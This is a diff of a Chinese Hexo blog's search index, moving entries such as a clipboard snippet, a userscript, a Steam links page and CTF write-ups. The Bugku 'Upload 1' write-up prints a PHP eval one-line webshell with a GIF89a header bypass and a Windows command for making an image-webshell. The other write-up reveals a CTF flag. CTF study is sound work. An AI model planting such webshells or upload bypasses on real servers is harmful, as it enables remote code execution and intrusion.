-<p><a href="https://blog.csdn.net/u013669912/article/details/130608711">VMware Workstation Pro 最新版本下载（Windows 、linux）_vmware-workstation pro win版的全版本官方链接-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>Other</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>实现复制</title>
-    <url>/UserScript-%E5%AE%9E%E7%8E%B0%E5%A4%8D%E5%88%B6/</url>
-    <content><![CDATA[<h1 id="实现复制"><a href="#实现复制" class="headerlink" title="实现复制"></a>实现复制</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;你好，我能被复制&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>点击复制<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;button&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 1. 获取input，并选择它</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;input&quot;</span>).<span class="title function_">select</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 2. 执行copy命令</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">execCommand</span>(<span class="string">&quot;copy&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>UserScript</category>
       </categories>
@@ -743,14 +746,6 @@
 
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV1UU4y1r72Y/?spm_id_from=333.337.search-card.all.click&vd_source=dde32bebfaef8d434caff0e95a159459">不用安编辑器，教你编写属于自己的第一个油猴脚本 - 哔哩哔哩</a></p>
 ]]></content>
-      <categories>
-        <category>UserScript</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>经典骗自己</title>
-    <url>/UserScript-%E7%BB%8F%E5%85%B8%E9%AA%97%E8%87%AA%E5%B7%B1/</url>
-    <content><![CDATA[<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         经典骗自己</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      2024-07-04</span></span><br><span class="line"><span class="comment">// @description  修改bugku个人中心页面所有显示出来的数据信息</span></span><br><span class="line"><span class="comment">// @author       Garmin</span></span><br><span class="line"><span class="comment">// @match        https://ctf.bugku.com/user/info/id/*</span></span><br><span class="line"><span class="comment">// @icon         https://www.google.com/s2/favicons?sz=64&amp;domain=ctf.bugku.com</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">contentEditable</span>=<span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>UserScript</category>
       </categories>
@@ -863,6 +858,29 @@
 <h2 id="Ditf"><a href="#Ditf" class="headerlink" title="Ditf"></a>Ditf</h2><p>使用 010Editor 修改图片宽高，将04 4C改为05 4C后保存，出现<code>StRe1izia</code>。<br>分离文件得到一个加密压缩包，用上面的字符串解密成功，得到抓包文件。</p>
 <p>搜索抓包文件中的关键词“png”，追踪http流找到一串字符。<br><code>ZmxhZ3tPel80bmRfSGlyMF9sb3YzX0ZvcjN2ZXJ9</code></p>
 <p>base64解码得到 flag 。<br><code>flag&#123;Oz_4nd_Hir0_lov3_For3ver&#125;</code></p>
+]]></content>
+      <categories>
+        <category>WriteUP</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Upload 1</title>
+    <url>/WriteUP-Upload%201/</url>
+    <content><![CDATA[<p><a href="https://ctf.bugku.com/challenges/detail/id/466.html">Upload 1 - Bugku CTF</a><br>本题是一个典型的文件上传漏洞题目。</p>
+<p>不选择文件直接点击“upload”按钮上传，页面显示报错。<br><code>Fatal error: Uncaught ValueError: Path cannot be empty in /var/www/html/upload.php:19 Stack trace: #0 /var/www/html/upload.php(19): exif_imagetype(&#39;&#39;) #1 &#123;main&#125; thrown in /var/www/html/upload.php on line 19</code></p>
+<p>发现该网站使用 exif_imagetype() 函数来判断上传文件的类型，而该函数是通过读取一个图像的第一个字节并检查其签名来判断一个图像的类型的。</p>
+<p>多轮测试发现该网站只能上传图像文件。<br>那我们可以使用修改文件头的方法来绕过上传限制上传一句话木马。</p>
+<h2 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h2><p>GIF89a图形文件是一个根据图形交换格式（GIF）89a版进行格式化之后的图形。</p>
+<p>上传如下php文件即可完成绕过。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再使用中国蚁剑连接目标服务器在根目录可以找到 flag 文件。</p>
+<h2 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h2><p>那我们同样也可以通过图片马的方式来绕过该网站限制。</p>
+<p>图片马的制作有以下几种方案。</p>
+<h3 id="编辑器添加数据"><a href="#编辑器添加数据" class="headerlink" title="编辑器添加数据"></a>编辑器添加数据</h3><p>准备一张图片，用记事本或者010editor等编辑器直接打开，在后面增加一句话木马，此时你得到了一个图片马，然后修改图片文件名的后缀为php上传即可。</p>
+<h3 id="burp抓包添加数据"><a href="#burp抓包添加数据" class="headerlink" title="burp抓包添加数据"></a>burp抓包添加数据</h3><p>在上传图片文件时，用bp抓取请求包，修改图片文件名后缀为 .php ，在图片文件内容后面增加一句话木马后放开请求即可。</p>
+<h3 id="Windows命令制作"><a href="#Windows命令制作" class="headerlink" title="Windows命令制作"></a>Windows命令制作</h3><p><code>copy x.png /b + 1.php /a shell.png</code><br>其中 x. png 是一个普通的 png 图片文件，1.php 是 webshell 文件。<br>该命令就是将以二进制方式读取的 x.png 文件内容和以 ASCII 编码方式读取的 1.php 文件内容合并，生成新的文件 shell. png 就是图片马了，最后修改图片文件名的后缀为php上传即可。</p>
+<p>一句话木马文件上传后使用中国蚁剑连接目标服务器在根目录可以找到 flag 文件。</p>
 ]]></content>
       <categories>
         <category>WriteUP</category>
@@ -1012,6 +1030,14 @@
       </categories>
   </entry>
   <entry>
+    <title>经典骗自己</title>
+    <url>/UserScript-%E7%BB%8F%E5%85%B8%E9%AA%97%E8%87%AA%E5%B7%B1/</url>
+    <content><![CDATA[<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         经典骗自己</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      2024-07-04</span></span><br><span class="line"><span class="comment">// @description  修改bugku个人中心页面所有显示出来的数据信息</span></span><br><span class="line"><span class="comment">// @author       Garmin</span></span><br><span class="line"><span class="comment">// @match        https://ctf.bugku.com/user/info/id/*</span></span><br><span class="line"><span class="comment">// @icon         https://www.google.com/s2/favicons?sz=64&amp;domain=ctf.bugku.com</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">contentEditable</span>=<span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>UserScript</category>
+      </categories>
+  </entry>
+  <entry>
     <title>极客大挑战2019 PHP</title>
     <url>/WriteUP-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%20PHP/</url>
     <content><![CDATA[<p>[[极客大挑战 2019]PHP-BUUCTF](<a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98">https://buuoj.cn/challenges#[极客大挑战</a> 2019]PHP)</p>
@@ -1032,44 +1058,6 @@
 ]]></content>
       <categories>
         <category>WriteUP</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Upload 1</title>
-    <url>/WriteUP-Upload%201/</url>
-    <content><![CDATA[<p><a href="https://ctf.bugku.com/challenges/detail/id/466.html">Upload 1 - Bugku CTF</a><br>本题是一个典型的文件上传漏洞题目。</p>
-<p>不选择文件直接点击“upload”按钮上传，页面显示报错。<br><code>Fatal error: Uncaught ValueError: Path cannot be empty in /var/www/html/upload.php:19 Stack trace: #0 /var/www/html/upload.php(19): exif_imagetype(&#39;&#39;) #1 &#123;main&#125; thrown in /var/www/html/upload.php on line 19</code></p>
-<p>发现该网站使用 exif_imagetype() 函数来判断上传文件的类型，而该函数是通过读取一个图像的第一个字节并检查其签名来判断一个图像的类型的。</p>
-<p>多轮测试发现该网站只能上传图像文件。<br>那我们可以使用修改文件头的方法来绕过上传限制上传一句话木马。</p>
-<h2 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h2><p>GIF89a图形文件是一个根据图形交换格式（GIF）89a版进行格式化之后的图形。</p>
-<p>上传如下php文件即可完成绕过。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>再使用中国蚁剑连接目标服务器在根目录可以找到 flag 文件。</p>
-<h2 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h2><p>那我们同样也可以通过图片马的方式来绕过该网站限制。</p>
-<p>图片马的制作有以下几种方案。</p>
-<h3 id="编辑器添加数据"><a href="#编辑器添加数据" class="headerlink" title="编辑器添加数据"></a>编辑器添加数据</h3><p>准备一张图片，用记事本或者010editor等编辑器直接打开，在后面增加一句话木马，此时你得到了一个图片马，然后修改图片文件名的后缀为php上传即可。</p>
-<h3 id="burp抓包添加数据"><a href="#burp抓包添加数据" class="headerlink" title="burp抓包添加数据"></a>burp抓包添加数据</h3><p>在上传图片文件时，用bp抓取请求包，修改图片文件名后缀为 .php ，在图片文件内容后面增加一句话木马后放开请求即可。</p>
-<h3 id="Windows命令制作"><a href="#Windows命令制作" class="headerlink" title="Windows命令制作"></a>Windows命令制作</h3><p><code>copy x.png /b + 1.php /a shell.png</code><br>其中 x. png 是一个普通的 png 图片文件，1.php 是 webshell 文件。<br>该命令就是将以二进制方式读取的 x.png 文件内容和以 ASCII 编码方式读取的 1.php 文件内容合并，生成新的文件 shell. png 就是图片马了，最后修改图片文件名的后缀为php上传即可。</p>
-<p>一句话木马文件上传后使用中国蚁剑连接目标服务器在根目录可以找到 flag 文件。</p>
-]]></content>
-      <categories>
-        <category>WriteUP</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Steam</title>
-    <url>/Other-Steam/</url>
-    <content><![CDATA[<p><a href="https://store.steampowered.com/">Steam</a> 是Valve公司推出的电子游戏数字发行平台，是全球最大的综合性数字发行平台之一。玩家可以在该平台购买、下载、讨论、上传和分享游戏和软件。</p>
-<p><a href="https://steamdb.info/">SteamDB</a> 是一个第三方Steam数据库网站，提供了大量Steam相关的有用信息。你可以在该网站上查询Steam游戏的区域信息、打折信息、价格变动信息以及激活码相关信息。此外，SteamDB还能帮助你预知游戏促销和大型活动，对于Steam的使用非常有帮助。</p>
-<p>玩家可以通过购买并使用CDKey来获得游戏，下面是一些CDKey的交易网站。</p>
-<ul>
-<li><a href="https://steampy.com/home">SteamPY</a></li>
-<li><a href="https://www.sonkwo.cn/">杉果游戏</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>Other</category>
       </categories>
   </entry>
 </search>
